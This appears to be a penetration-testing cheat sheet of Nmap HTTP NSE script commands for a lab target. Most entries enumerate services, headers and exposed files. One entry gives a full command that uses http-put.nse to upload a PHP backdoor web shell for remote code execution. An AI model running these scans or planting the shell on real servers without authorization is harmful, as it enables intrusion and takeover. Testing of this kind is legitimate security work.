# 📘 Nmap HTTP NSE Scripts

This document outlines a series of Nmap commands using various HTTP-related NSE (Nmap Scripting Engine) scripts. These scripts are designed to help in identifying details about HTTP services, vulnerabilities, and configurations on target systems.

⚠️ Be cautious when using scripts that could potentially alter the target system (e.g., `http-put.nse`).

---

### 1. `http-enum.nse` – Enumerates HTTP services or web applications 🔍  
This script attempts to discover common web applications or HTTP services running on a target.

```bash
nmap -v -Pn -sT -sV -p 80 --script=http-enum.nse 192.168.1.207
```

---

### 2. `http-headers.nse` – Retrieves HTTP headers 📬  
This script fetches the HTTP headers, which may reveal details about the web server or application.

```bash
nmap -v -Pn -sT -sV -p 80 --script=http-headers.nse 192.168.1.207
```

---

### 3. `http-php-version.nse` – Detects PHP version 🐘  
This script checks if the server is running PHP and attempts to determine the PHP version.

```bash
nmap -p 80 192.168.1.207 --script=http-php-version.nse
```

---

### 4. `http-*` – Run all HTTP-related NSE scripts 🧰  
This command runs all HTTP-related scripts available in Nmap, providing a comprehensive scan of the target.

```bash
nmap -v -sT -sV -A -O -p 80 --script=http-* 192.168.1.207
```

---

### 5. `http-put.nse` – Upload a PHP shell (⚠️ Use with caution) 💣  
This script tries to upload a PHP shell (e.g., `shell.php`) to the target server, which could result in potential remote code execution.

```bash
nmap -v -Pn -sT -sV -p 80 \
--script=http-put.nse \
--script-args="http-put.url='/test/php-backdoor.php',http-put.file='/usr/share/webshells/php/simple-backdoor.php'" \
192.168.1.233
```

---

### 6. `http-robots.txt.nse` – Checks for robots.txt 🤖  
This script attempts to find and analyze the `robots.txt` file, which might contain sensitive information (like directories or files that are not meant to be indexed).

```bash
nmap -v -Pn -sT -sV -p 80 --script=http-robots.txt.nse 192.168.1.207
```

---

### 7. `http-config-backup.nse` – Searches for exposed backups 🗄️  
This script looks for backup configurations (e.g., `.bak`) that may be exposed to the public and could reveal sensitive information.

```bash
nmap -v -Pn -sT -sV -p 80 --script=http-config-backup.nse 192.168.1.207
```

---

### 📌 Notes:

- `-v`: Increases verbosity  
- `-Pn`: Skips host discovery (useful if the target is behind a firewall)  
- `-sT`: Initiates a TCP connect scan (useful when SYN scan is blocked)  
- `-sV`: Attempts to identify service versions on open ports  
-  Be cautious with scripts like `http-put.nse` as they can make changes to the target system.
